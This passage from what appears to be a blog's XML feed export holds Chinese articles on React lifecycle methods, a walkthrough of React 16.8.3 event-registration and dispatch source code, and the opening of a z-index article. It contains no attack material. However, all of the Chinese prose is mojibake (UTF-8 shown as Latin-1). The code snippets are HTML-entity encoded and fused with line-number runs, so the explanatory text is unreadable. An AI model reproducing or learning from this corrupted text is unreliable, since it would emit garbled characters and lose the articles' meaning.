ä¸ä¼šè°ƒç”¨ constructoré€šå¸¸ï¼Œä½¿ç”¨ constructor åªå› ä¸ºä¸‹é¢ä¸¤ä¸ªç›®çš„ï¼š åˆå§‹åŒ–æœ¬åœ° state ç»‘å®š event ä¸åº”è¯¥åœ¨ constructor æ‰§è¡Œæœ‰å‰¯ä½œç”¨çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åº”è¯¥æ”¾åœ¨ componentDidMount é‡Œé¢ã€‚å¦å¤–ä¹Ÿä¸åº”è¯¥åœ¨ construtor ä¸­ç”¨ props åˆå§‹åŒ– stateã€‚ componentDidMountè¿™æ˜¯ä¸ªæ‹‰å–å¼‚æ­¥æ•°æ®çš„å¥½åœ°æ–¹ï¼Œä¹Ÿå¯ä»¥åœ¨è¿™ä¸ªæ–¹æ³•è®¢é˜…äº‹ä»¶ï¼Œä½†æ˜¯è¦è®°å¾—åœ¨ componentWillUnmount ä¸­å–æ¶ˆè®¢é˜…ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚ componentDidUpdateè¿™é‡Œå¯ä»¥æ£€æµ‹ DOM çš„æ›´æ–°å’Œ prop çš„æ›´æ–°ï¼Œæ‰§è¡Œä¸€äº›ç½‘ç»œè¯·æ±‚ï¼Œæˆ–è€…æ›´æ”¹ DOMã€‚ componentWillUnmountåšä¸€äº›æ¸…ç†å·¥ä½œ ä¸å¸¸ç”¨çš„ä¸€äº›ç”Ÿå‘½å‘¨æœŸæ–¹æ³•shouldComponentUpdateä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè®© react çŸ¥é“ä¸€ä¸ªç»„ä»¶æ˜¯å¦åº”è¯¥è¢«æ›´æ–°ã€‚é€šå¸¸åœ¨æ€§èƒ½ä¼˜åŒ–çš„æ—¶å€™ä½¿ç”¨ã€‚ static getDerivedStateFromPropsç›‘å¬ props çš„å˜æ›´ï¼Œè¿›è€Œæ›´æ–°å½“å‰ç»„ä»¶çš„ stateã€‚ä½¿ç”¨å‰åº”è¯¥ç¡®ä¿ä½ ç¡®å®éœ€è¦å®ƒï¼Œä¸Šæ–‡æœ‰è¯´æ˜åŸå› ã€‚ getSnapshotBeforeUpdateåœ¨ render ä¹‹åï¼Œæäº¤ DOM å˜æ›´ä¹‹å‰æ‰§è¡Œï¼Œè·å–å½“å‰æ‰§è¡Œç¯å¢ƒå¿«ç…§ã€‚ é”™è¯¯æ•è·é’©å­å‡½æ•°ä¸€ä¸ªé”™è¯¯æ•è·ç»„ä»¶å¯ä»¥æ•è·å®ƒçš„å­ç»„ä»¶çš„é”™è¯¯ï¼Œå°†é”™è¯¯ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¹¶ä¸”ä½¿ç”¨æ–°çš„ UI æ›¿æ¢å½“å‰ UIã€‚ä¸€ä¸ª class component åªè¦æ‹¥æœ‰ static getDerivedSateFromError() or componentDidCatch() å®ƒå°±ä¼šå˜æˆä¸€ä¸ªé”™è¯¯æ•è·ç»„ä»¶ã€‚ æ³¨æ„åº”è¯¥ä»…ä»…ç”¨åœ¨é¢„æ–™ä¹‹å¤–çš„æƒ…å†µï¼Œè€Œä¸æ˜¯åœ¨å¯æ§çš„é”™è¯¯çŠ¶æ€ä¸‹ã€‚å¹¶ä¸”è¿™ä¸ªç»„ä»¶ä¸ä¼šæ•è·å®ƒä»¬è‡ªèº«çš„é”™è¯¯ã€‚ static getDerivedStateFromErrorè¿™ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°åœ¨å­ç»„ä»¶æŠ›å‡ºé”™è¯¯çš„æ—¶å€™æ‰§è¡Œã€‚æ¥å—ä¸€ä¸ª error å‚æ•°ï¼Œåº”è¯¥è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œæ›´æ–° state123456789101112131415161718class ErrorBoundary extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; static getDerivedStateFromError(error) &#123; return &#123;hasError: true&#125; &#125; render() &#123; if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong&lt;/h1&gt;; &#125; return this.props.children; &#125;&#125; æ³¨æ„getDerivedStateFromError å‘ç”Ÿåœ¨æ¸²æŸ“é˜¶æ®µï¼Œä¸åº”è¯¥æ‰§è¡Œå¸¦æœ‰å‰¯ä½œç”¨çš„å‡½æ•°ã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œåº”è¯¥ä½¿ç”¨ componentDidCatch å–ä»£ã€‚ componentDidCatchåœ¨å­ç»„ä»¶æŠ›å‡ºé”™è¯¯æ—¶è§¦å‘ï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°ï¼š error - æŠ›å‡ºçš„é”™è¯¯ info - ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å« componentStackï¼Œè¡¨æ˜æ˜¯å“ªä¸ª component æŠ›å‡ºçš„é”™è¯¯ã€‚ componentDidCatch åœ¨æäº¤é˜¶æ®µè§¦å‘ã€‚æ‰€ä»¥ log å‡½æ•°ï¼Œæ•°æ®ä¸ŠæŠ¥è¯·æ±‚ï¼Œåº”è¯¥åœ¨è¿™é‡Œå‘å‡ºã€‚ getDefaultPropsç”¨äºè®¾ç½®é»˜è®¤çš„ props å€¼ï¼Œå¦‚æœçˆ¶ç»„ä»¶æœ‰ç›´æ¥ä¼ å€¼è¿‡æ¥æˆ–è€…ä¼ å…¥ undefinedï¼Œä¼šå°†å…¶è¦†ç›–ã€‚ ç»„ä»¶åˆ›å»ºæ—¶æœŸè°ƒç”¨ä¸€æ¬¡ï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•åœ¨å®ä¾‹åŒ–ä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªæ–¹æ³•é‡Œé¢è¿˜ä¸èƒ½ä¾èµ– thisã€‚ä¸è¿‡è¿™æ˜¯ es5 å†™æ³•ï¼Œå¤ªè¿‡æ—¶äº†ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹çœ‹ es6: 123static defaultProps = &#123; txt: 'hello world',&#125; getInitialStateç”¨äºåˆå§‹åŒ– this.state çš„å€¼ã€‚ åœ¨ç»„ä»¶åˆ›å»ºçš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ es5 å†™æ³•ï¼Œå°±ä¸å¤šåšä»‹ç»äº†ï¼Œç›´æ¥ä¸Š es6: 123456class TestState extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;active: false&#125;; &#125;&#125;]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>ç”Ÿå‘½å‘¨æœŸ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reactäº‹ä»¶ç³»ç»Ÿ]]></title>
    <url>%2Freact%E4%BA%8B%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[TL;DR react16.8.3 react äº‹ä»¶ç³»ç»Ÿåˆ†ä¸ºäº‹ä»¶æ³¨å†Œå’Œäº‹ä»¶åˆ†å‘ä¸¤ä¸ªé˜¶æ®µã€‚ äº‹ä»¶æ³¨å†Œé˜¶æ®µå°†å¤§éƒ¨åˆ†äº‹ä»¶ç»‘å®šåˆ° documentï¼Œåœ¨äº‹ä»¶åˆ†å‘é˜¶æ®µè°ƒç”¨ dispatchEventè¿›è¡Œäº‹ä»¶æ•è·ã€äº‹ä»¶å†’æ³¡åˆ†å‘ã€‚ äº‹ä»¶åˆ†å‘é˜¶æ®µä¼šå…ˆæ ¹æ®äº‹ä»¶ç±»å‹è°ƒç”¨å¯¹åº” EventPlugin è¿›è¡Œäº‹ä»¶åˆæˆï¼Œæ•è·å’Œå†’æ³¡é˜¶æ®µä¼šæ‰§è¡Œçš„ listener éƒ½ä¼šå­˜å‚¨åˆ° event._dispatchListeners å‰ç½®çŸ¥è¯†12345678910111213141516171819202122232425262728293031323334// ä¸¤å˜é‡æ•°ç»„åˆå¹¶function accumulate&lt;T&gt;( current: ?(T | Array&lt;T&gt;), next: T | Array&lt;T&gt;,): T | Array&lt;T&gt; &#123; if (current == null) &#123; return next; &#125; // Both are not empty. Warning: Never call x.concat(y) when you are not // certain that x is an Array (x could be a string with concat method). if (Array.isArray(current)) &#123; return current.concat(next); &#125; if (Array.isArray(next)) &#123; return [current].concat(next); &#125; return [current, next];&#125;// å°†æ•°ç»„é‡Œé¢çš„æ¯ä¸ªå…ƒç´ ä½œä¸º cb çš„å‚æ•°,æ‰§è¡Œ cbfunction forEachAccumulated&lt;T&gt;( arr: ?(Array&lt;T&gt; | T), cb: (elem: T) =&gt; void, scope: ?any,) &#123; if (Array.isArray(arr)) &#123; arr.forEach(cb, scope); &#125; else if (arr) &#123; cb.call(scope, arr); &#125;&#125; äº‹ä»¶æ³¨å†Œ æ ¹æ®ä¸Šå›¾æ­¥éª¤æˆ‘ä»¬é€æ­¥åˆ†æä¸€ä¸‹å…·ä½“ç»†èŠ‚ã€‚ åœ¨ document ä¸Šç»‘å®šäº‹ä»¶document ä¸ŠåŒä¸€ç±»å‹çš„äº‹ä»¶åªä¼šç»‘å®šä¸€æ¬¡ã€‚ä¸¾ä¸ªğŸŒ°ï¼š12345678function Control() &#123; return ( &lt;&gt; &lt;button onClick=&#123;() =&gt; console.log('button1')&#125;&gt;&lt;/button&gt; &lt;button onClick=&#123;() =&gt; console.log('button2')&#125;&gt;&lt;/button&gt; &lt;/&gt; )&#125; è¿™é‡Œæˆ‘ä»¬åœ¨ä¸¤ä¸ª button åˆ†åˆ«ç»‘å®šäº†ä¸€æ¬¡ click äº‹ä»¶, ä½†æ˜¯åœ¨ document ä¸Šåªä¼šç»‘å®šä¸€æ¬¡ã€‚ç»§ç»­æ‹¿ click äº‹ä»¶ä¸¾ä¾‹ï¼Œè®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸‹æºç ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243// ... ä»¥ä¸Šçœç•¥å¤§é‡å…¶ä»–äº‹ä»¶çš„æ¡ä»¶ç»‘å®šã€‚dependency ä¸º react å®šä¹‰çš„äº‹ä»¶åï¼Œä¸åŸäº‹ä»¶å­˜åœ¨ä¸€ä¸ªæ˜ å°„// æ¯”å¦‚ topClick å¯¹åº”çš„æ˜¯ click äº‹ä»¶ç›¸å…³ä¸œè¥¿ï¼Œåé¢äº‹ä»¶åˆæˆå†ç»†è¯´// mountAt å³ documenttrapBubbledEvent(dependency, mountAt);// å°†è¯¥æ ‡è®°ä¸ºå·²ç»‘å®šï¼Œåç»­ä¸ä¼šé‡å¤ç»‘å®šisListening[dependency] = true;// ReactDOMEventListener.js é‡Œé¢çš„ç»‘å®šå†’æ³¡äº‹ä»¶å‡½æ•°export function trapBubbledEvent( topLevelType: DOMTopLevelEventType, element: Document | Element,) &#123; if (!element) &#123; return null; &#125; const dispatch = isInteractiveTopLevelEventType(topLevelType) ? dispatchInteractiveEvent : dispatchEvent; addEventBubbleListener( element, getRawEventName(topLevelType), // è·å– native äº‹ä»¶å // Check if interactive and wrap in interactiveUpdates dispatch.bind(null, topLevelType), );&#125;// EventListener.js æœ‰ä¸¤ä¸ªå‡½æ•°è¿›è¡Œäº‹ä»¶æ•è·å’Œäº‹ä»¶å†’æ³¡çš„äº‹ä»¶ç»‘å®šexport function addEventBubbleListener( element: Document | Element, eventType: string, listener: Function,): void &#123; element.addEventListener(eventType, listener, false);&#125;export function addEventCaptureListener( element: Document | Element, eventType: string, listener: Function,): void &#123; element.addEventListener(eventType, listener, true);&#125; ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºåœ¨ document ä¸Šç»‘å®šçš„å…¶å®éƒ½æ˜¯dispatchäº‹ä»¶ã€‚äº‹ä»¶æ‰§è¡Œçš„æ—¶å€™å°±æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°è¿›è¡Œäº‹ä»¶åˆ†å‘ã€‚ åœ¨ target dom ä¸Šç»‘å®š noop å‡½æ•°react ä¼šåœ¨ç›®æ ‡ dom ä¸Šä¹Ÿç»‘å®šä¸€ä¸ªäº‹ä»¶ï¼Œäº‹ä»¶å¯¹åº”çš„ç›‘å¬å‡½æ•°ä¸ºä¸€ä¸ªç©ºå‡½æ•°ï¼š1function noop() &#123;&#125; è¿™æ˜¯ä¸ºäº†å°† target dom ä¸Šçš„ native event å†’æ³¡åˆ° documentï¼Œåœ¨ç”± document è¿›è¡Œå¤„ç†ã€‚ ä¸ºä»€ä¹ˆä¸æ˜¯æ‰€æœ‰äº‹ä»¶éƒ½ç»‘å®šåˆ° document123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// react ä¸­æœ‰è¿™ä¹ˆæ®µä»£ç export function listenTo( registrationName: string, mountAt: Document | Element,) &#123; const isListening = getListeningForDocument(mountAt); const dependencies = registrationNameDependencies[registrationName]; for (let i = 0; i &lt; dependencies.length; i++) &#123; const dependency = dependencies[i]; if (!(isListening.hasOwnProperty(dependency) &amp;&amp; isListening[dependency])) &#123; switch (dependency) &#123; case TOP_SCROLL: trapCapturedEvent(TOP_SCROLL, mountAt); break; case TOP_FOCUS: case TOP_BLUR: trapCapturedEvent(TOP_FOCUS, mountAt); trapCapturedEvent(TOP_BLUR, mountAt); // We set the flag for a single dependency later in this function, // but this ensures we mark both as attached rather than just one. isListening[TOP_BLUR] = true; isListening[TOP_FOCUS] = true; break; case TOP_CANCEL: case TOP_CLOSE: if (isEventSupported(getRawEventName(dependency))) &#123; trapCapturedEvent(dependency, mountAt); &#125; break; case TOP_INVALID: case TOP_SUBMIT: case TOP_RESET: // è¿™é‡Œæ˜¯é‡ç‚¹ï¼ï¼ï¼ï¼ // è¿™äº›äº‹ä»¶ä¼šç›´æ¥ç»‘å®šåˆ°å¯¹åº”çš„ dom ç»“æ„ä¸Š // We listen to them on the target DOM elements. // Some of them bubble so we don't want them to fire twice. break; default: // By default, listen on the top level to all non-media events. // Media events don't bubble so adding the listener wouldn't do anything. const isMediaEvent = mediaEventTypes.indexOf(dependency) !== -1; if (!isMediaEvent) &#123; trapBubbledEvent(dependency, mountAt); &#125; break; &#125; isListening[dependency] = true; &#125; &#125;&#125; äº‹ä»¶åˆ†å‘ å¯èƒ½ç°åœ¨å·²ç»æœ‰å¾ˆå¤šåŒå­¦å‘èµ·ç–‘é—®äº†ï¼Œä¹‹å‰ç»‘å®šåˆ° component çš„ listener å“ªå»äº†å‘¢ï¼Ÿä»€ä¹ˆæ—¶å€™è¢«æ‰§è¡Œå‘¢ï¼Ÿç¨³ä½ï¼Œä½ å°†ä¼šçœ‹åˆ°äº†ã€‚ æŸ¥æ‰¾è§¦å‘äº‹ä»¶çš„ componentå‰é¢æˆ‘ä»¬è®²è¿‡ï¼Œæˆ‘ä»¬ç»‘å®šçš„åœ¨ document ä¸Šçš„ listener å…¶å®éƒ½æ˜¯ dispatch è¿™ä¸ªåˆ†å‘å‡½æ•°ã€‚å…·ä½“å®ç°å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// ReactDOMEventListener.jsexport function dispatchEvent( topLevelType: DOMTopLevelEventType, nativeEvent: AnyNativeEvent,) &#123; // ..... // è·å–è§¦å‘äº‹ä»¶çš„ target const nativeEventTarget = getEventTarget(nativeEvent); // æ ¹æ® target event å¯¹è±¡æŸ¥æ‰¾å¯¹åº”çš„è™šæ‹Ÿ dom èŠ‚ç‚¹ï¼Œcomponent let targetInst = getClosestInstanceFromNode(nativeEventTarget); //.... // bookKeeping çš„å¯¹è±¡ç¼“å­˜// &#123;// topLevelType,// nativeEvent,// targetInst,// ancestors: []// &#125;; const bookKeeping = getTopLevelCallbackBookKeeping( topLevelType, nativeEvent, targetInst, ); try &#123; // Event queue being processed in the same cycle allows // `preventDefault`. // æ§åˆ¶å‡½æ•°æ‰§è¡Œå‰åçš„ä¸€ä¸ªçŠ¶æ€æ¢å¤ // å®è´¨æ˜¯ç”¨äºæ‰§è¡Œ handleTopLevel batchedUpdates(handleTopLevel, bookKeeping); &#125; finally &#123; releaseTopLevelCallbackBookKeeping(bookKeeping); &#125;&#125;function handleTopLevel(bookKeeping) &#123; let targetInst = bookKeeping.targetInst; // Loop through the hierarchy, in case there's any nested components. // It's important that we build the array of ancestors before calling any // event handlers, because event handlers can modify the DOM, leading to // inconsistencies with ReactMount's node cache. See #1105. // æŸ¥æ‰¾ç¥–å…ˆ root çš„ containerï¼Œé€šå¸¸ä¸º null let ancestor = targetInst; do &#123; if (!ancestor) &#123; bookKeeping.ancestors.push(ancestor); break; &#125; const root = findRootContainerNode(ancestor); if (!root) &#123; break; &#125; bookKeeping.ancestors.push(ancestor); ancestor = getClosestInstanceFromNode(root); &#125; while (ancestor); for (let i = 0; i &lt; bookKeeping.ancestors.length; i++) &#123; targetInst = bookKeeping.ancestors[i]; runExtractedEventsInBatch( bookKeeping.topLevelType, targetInst, bookKeeping.nativeEvent, getEventTarget(bookKeeping.nativeEvent), ); &#125;&#125; ä¸Šé¢ä»£ç çš„ runExtractedEventsInBatch å‡½æ•°ï¼Œå°±æ˜¯æˆ‘ä»¬å³å°†è¦åˆ†æç”Ÿæˆåˆæˆäº‹ä»¶çš„è¿‡ç¨‹ã€‚ ç”Ÿæˆåˆæˆäº‹ä»¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// EventPluginHub.jsexport function runExtractedEventsInBatch( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: AnyNativeEvent, nativeEventTarget: EventTarget,) &#123; // ç”Ÿæˆåˆæˆäº‹ä»¶ï¼Œä¸ºæ•°ç»„ç±»å‹ï¼Œå¯èƒ½ä¸æ­¢ä¸€ä¸ª const events = extractEvents( topLevelType, targetInst, nativeEvent, nativeEventTarget, ); // è¿è¡Œåˆæˆäº‹ä»¶ï¼Œè¿™ä¸ªæˆ‘ä»¬åé¢å†åˆ†æ runEventsInBatch(events);&#125;function extractEvents( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: AnyNativeEvent, nativeEventTarget: EventTarget,): Array&lt;ReactSyntheticEvent&gt; | ReactSyntheticEvent | null &#123; let events = null; // EventPluginHubåœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œæ³¨å…¥äº†ä¸ƒä¸ªplugin // ä½¿ç”¨è¿™äº›æ’ä»¶åˆ†åˆ«å¤„ç†ä¸åŒçš„äº‹ä»¶ for (let i = 0; i &lt; plugins.length; i++) &#123; // Not every plugin in the ordering may be loaded at runtime. const possiblePlugin: PluginModule&lt;AnyNativeEvent&gt; = plugins[i]; if (possiblePlugin) &#123; // é‡ç‚¹ï¼Œæ¯ä¸ª plugin éƒ½å¿…é¡»æœ‰ extractEvents æ–¹æ³• // ç”¨äºä»å¯¹åº” plugin çš„äº‹ä»¶æ± ä¸­å–å‡ºå®ä¾‹ // æ¢å¥è¯è¯´å°±æ˜¯ï¼Œé€šè¿‡ extractEvents ç”Ÿæˆäº†å•ä¸ªåˆæˆäº‹ä»¶ const extractedEvents = possiblePlugin.extractEvents( topLevelType, targetInst, nativeEvent, nativeEventTarget, ); if (extractedEvents) &#123; // æ•°ç»„åˆå¹¶ events = accumulateInto(events, extractedEvents); &#125; &#125; &#125; return events;&#125; ä»ä¸Šè¿°æºç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œåˆæˆäº‹ä»¶æ˜¯äº‹ä»¶æ’ä»¶é€šè¿‡ extractEvents ç”Ÿæˆçš„ã€‚æˆ‘ä»¬ç”¨ SimpleEventPlugin æ¥ä¸¾ä¾‹è¯´æ˜ extractEvents çš„å·¥ä½œåŸç†ã€‚å‡è®¾è§¦å‘äº‹ä»¶ä¸º click äº‹ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118// SimpleEventPlugin.js extractEvents: function( topLevelType: TopLevelType, targetInst: null | Fiber, nativeEvent: MouseEvent, nativeEventTarget: EventTarget, ): null | ReactSyntheticEvent &#123; const dispatchConfig = topLevelEventsToDispatchConfig[topLevelType]; if (!dispatchConfig) &#123; return null; &#125; let EventConstructor; switch (topLevelType) &#123; case DOMTopLevelEventTypes.TOP_KEY_PRESS: // ........ çœç•¥ä¸€å †åˆ¤æ–­ /* falls through */ case DOMTopLevelEventTypes.TOP_AUX_CLICK: case DOMTopLevelEventTypes.TOP_DOUBLE_CLICK: case DOMTopLevelEventTypes.TOP_MOUSE_DOWN: case DOMTopLevelEventTypes.TOP_MOUSE_MOVE: case DOMTopLevelEventTypes.TOP_MOUSE_UP: EventConstructor = SyntheticMouseEvent; // ......... &#125; // ä»ä¸Šè¿°ä»£ç å¯çœ‹å‡ºï¼Œæˆ‘ä»¬å–å‡º click äº‹ä»¶å¯¹åº”çš„æ„é€ å‡½æ•° // ç„¶åé€šè¿‡é™æ€æ–¹æ³•ï¼Œä»äº‹ä»¶æ± ä¸­å–å‡ºä¸€ä¸ªäº‹ä»¶ const event = EventConstructor.getPooled( dispatchConfig, targetInst, nativeEvent, nativeEventTarget, ); // äº‹ä»¶çš„åˆå§‹æ“ä½œ // ç”¨æ¥ç»‘å®šäº‹ä»¶æ•è·å’Œäº‹ä»¶å†’æ³¡è¿‡ç¨‹ä¸­æ¶‰åŠçš„ç›‘å¬å‡½æ•° accumulateTwoPhaseDispatches(event); return event; &#125;,// EventPropagators.jsexport function accumulateTwoPhaseDispatches(events) &#123; // å°†æ¯ä¸ª events äº‹ä»¶åœ¨ accumulateTwoPhaseDispatchesSingle ä¸Šæ‰§è¡Œ forEachAccumulated(events, accumulateTwoPhaseDispatchesSingle);&#125;function accumulateTwoPhaseDispatchesSingle(event) &#123; if (event &amp;&amp; event.dispatchConfig.phasedRegistrationNames) &#123; // accumulateDirectionalDispatches åé¢æˆ‘ä»¬åœ¨è§£æ traverseTwoPhase(event._targetInst, accumulateDirectionalDispatches, event); &#125;&#125;// ReactTreeTraversal.js// æŸ¥æ‰¾ç›®æ ‡èŠ‚ç‚¹çˆ¶èŠ‚ç‚¹// fn ä¸ºä¸Šé¢çš„ accumulateDirectionalDispatchesexport function traverseTwoPhase(inst, fn, arg) &#123; const path = []; while (inst) &#123; path.push(inst); inst = getParent(inst); &#125; let i; // ç”Ÿæˆæ•è·æµç¨‹ for (i = path.length; i-- &gt; 0; ) &#123; fn(path[i], 'captured', arg); &#125; // ç”Ÿæˆå†’æ³¡æµç¨‹ for (i = 0; i &lt; path.length; i++) &#123; fn(path[i], 'bubbled', arg); &#125;&#125;// EventPropagators.js// åˆ°è¿™é‡Œæˆ‘ä»¬ç»ˆäºçœ‹åˆ° _dispatchListeners äº†// _dispatchListener æŒ‰æ•è·å’Œå†’æ³¡çš„é¡ºåºå­˜å‚¨äº†å¯¹åº”çš„ listenerfunction accumulateDirectionalDispatches(inst, phase, event) &#123; // æŸ¥æ‰¾ component ä¸Šé¢çš„ listener const listener = listenerAtPhase(inst, event, phase); if (listener) &#123; event._dispatchListeners = accumulateInto( event._dispatchListeners, listener, ); // å­˜å‚¨å®ä¾‹ event._dispatchInstances = accumulateInto(event._dispatchInstances, inst); &#125;&#125;// è·å– dom çš„listenerfunction listenerAtPhase(inst, event, propagationPhase: PropagationPhases) &#123; const registrationName = event.dispatchConfig.phasedRegistrationNames[propagationPhase]; return getListener(inst, registrationName);&#125;// EventPluginHub.jsexport function getListener(inst: Fiber, registrationName: string) &#123; let listener; // TODO: shouldPreventMouseEvent is DOM-specific and definitely should not // live here; needs to be moved to a better place soon const stateNode = inst.stateNode; if (!stateNode) &#123; // Work in progress (ex: onload events in incremental mode). return null; &#125; // æŸ¥æ‰¾å¯¹åº” component çš„props const props = getFiberCurrentPropsFromNode(stateNode); if (!props) &#123; // Work in progress. return null; &#125; // ä» props ä¸­å–å‡º listener // è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»åˆå§‹åŒ–å®Œäº†åˆæˆäº‹ä»¶ listener = props[registrationName]; if (shouldPreventMouseEvent(registrationName, inst.type, props)) &#123; return null; &#125; return listener;&#125; æ‰§è¡Œåˆæˆäº‹ä»¶æ¥ç€æˆ‘ä»¬ä¸Šæ–‡ runEventsInBatch å‡½æ•°ï¼Œæ‰§è¡Œåˆæˆäº‹ä»¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// EventPluginHub.jsexport function runEventsInBatch( events: Array&lt;ReactSyntheticEvent&gt; | ReactSyntheticEvent | null,) &#123; // å’Œå½“å‰äº‹ä»¶é˜Ÿåˆ—åˆå¹¶ if (events !== null) &#123; eventQueue = accumulateInto(eventQueue, events); &#125; // Set `eventQueue` to null before processing it so that we can tell if more // events get enqueued while processing. const processingEventQueue = eventQueue; eventQueue = null; if (!processingEventQueue) &#123; return; &#125; // æ‰§è¡Œäº‹ä»¶é˜Ÿåˆ—ä¸­çš„äº‹ä»¶ forEachAccumulated(processingEventQueue, executeDispatchesAndReleaseTopLevel); // This would be a good time to rethrow if any of the event handlers threw. rethrowCaughtError();&#125;// å¿ä½ï¼Œå¿«æ‘¸åˆ°ç“œäº†const executeDispatchesAndReleaseTopLevel = function(e) &#123; return executeDispatchesAndRelease(e);&#125;;const executeDispatchesAndRelease = function(event: ReactSyntheticEvent) &#123; if (event) &#123; // æŒ‰é¡ºåºæ‰§è¡Œäº‹ä»¶ executeDispatchesInOrder(event); // æ‰§è¡Œå®Œåé‡Šæ”¾äº‹ä»¶å®ä¾‹ï¼Œæ”¾å›äº‹ä»¶å¯¹è±¡æ±  if (!event.isPersistent()) &#123; event.constructor.release(event); &#125; &#125;&#125;;// EventPluginUtils.js// æœ€åä¸€æ­¥äº†export function executeDispatchesInOrder(event) &#123; // å–å‡ºä¹‹å‰æˆ‘ä»¬å­˜å…¥ dispatchListeners çš„listener æ‰§è¡Œ const dispatchListeners = event._dispatchListeners; const dispatchInstances = event._dispatchInstances; if (__DEV__) &#123; validateEventDispatches(event); &#125; if (Array.isArray(dispatchListeners)) &#123; for (let i = 0; i &lt; dispatchListeners.length; i++) &#123; if (event.isPropagationStopped()) &#123; break; &#125; // Listeners and Instances are two parallel arrays that are always in sync. executeDispatch(event, dispatchListeners[i], dispatchInstances[i]); &#125; &#125; else if (dispatchListeners) &#123; executeDispatch(event, dispatchListeners, dispatchInstances); &#125; event._dispatchListeners = null; event._dispatchInstances = null;&#125;function executeDispatch(event, listener, inst) &#123; const type = event.type || 'unknown-event'; event.currentTarget = getNodeFromInstance(inst); invokeGuardedCallbackAndCatchFirstError(type, listener, undefined, event); event.currentTarget = null;&#125;// invokeGuardedCallbackImpl.js// æœ€ç»ˆé€šè¿‡è¿™ä¸ªå‡½æ•°æ‰§è¡Œæˆ‘ä»¬çš„ listener// func å³æˆ‘ä»¬çš„ listenerlet invokeGuardedCallbackImpl = function&lt;A, B, C, D, E, F, Context&gt;( name: string | null, func: (a: A, b: B, c: C, d: D, e: E, f: F) =&gt; mixed, context: Context, a: A, b: B, c: C, d: D, e: E, f: F,) &#123; const funcArgs = Array.prototype.slice.call(arguments, 3); try &#123; func.apply(context, funcArgs); &#125; catch (error) &#123; this.onError(error); &#125;&#125;; å®Œæ¯•ï¼ å‚è€ƒç¾å¥³é»„ç¼å¤§ç¥ï¼Œå»ºè®®é˜…è¯»æ­ç§˜Reactå½¢æˆåˆæˆäº‹ä»¶çš„è¿‡ç¨‹ä¸€çœ‹å°±æ™•çš„Reactäº‹ä»¶æœºåˆ¶ æ„Ÿè°¢é˜…è¯»]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>äº‹ä»¶ç³»ç»Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£z-index]]></title>
    <url>%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3z-index%2F</url>
    <content type="text"><![CDATA[z-index ç®€å•å‘€ï¼Œæƒ³æ˜¾ç¤ºåœ¨ä¸Šé¢ç»™ä¸ªå¤§ç‚¹çš„æ•´æ•°ä¸ä¹…è¡Œäº†å—â“â“â“ æˆ‘ä»¬æƒ³çš„è¿˜æ˜¯ç®€å•äº†ç‚¹ï¼Œè¿™å°±å¥½åƒå†™äº†ä¸€æ®µèƒ½è·‘çš„ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“å®ƒæ˜¯æ€ä¹ˆè·‘èµ·æ¥çš„ï¼Œè¿™å°±æ˜¯æ–°æ‰‹å’Œå¤§ä½¬çš„å·®è·ã€‚è¦å­¦çš„è¿˜å¾ˆå¤šï¼Œä¸”å‹¿éª„å‹¿èºï¼Œä¸å›å…±å‹‰ï¼ z-index ç®€å•æ¥è¯´å°±æ˜¯èƒ½å¤Ÿæ§åˆ¶å±‚å ä¸Šä¸‹æ–‡ä¸­å…ƒç´ åœ¨ z è½´å‰åä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥å…ˆç†è§£ä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡æ‰èƒ½æ›´å¥½ç†è§£ z-index å·¥ä½œåŸç†ï¼Œä»¥åŠä½¿ç”¨ z-index çš„æ­£ç¡®å§¿åŠ¿ã€‚ å—¯ï¼Œå¥½ï¼å¸¦ç€è¿™ä¸ªé—®é¢˜å¾€ä¸‹çœ‹ï¼šä»€ä¹ˆæ˜¯å±‚å ä¸Šä¸‹æ–‡ï¼Ÿ æ­¤å¤„ä½ å¯èƒ½ä¼šå¿ä¸ä½ä¸€å£°é•¿å¹ï¼Œåˆæ˜¯ä¸€ä¸ªæ–°æ¦‚å¿µå‘€ï½ 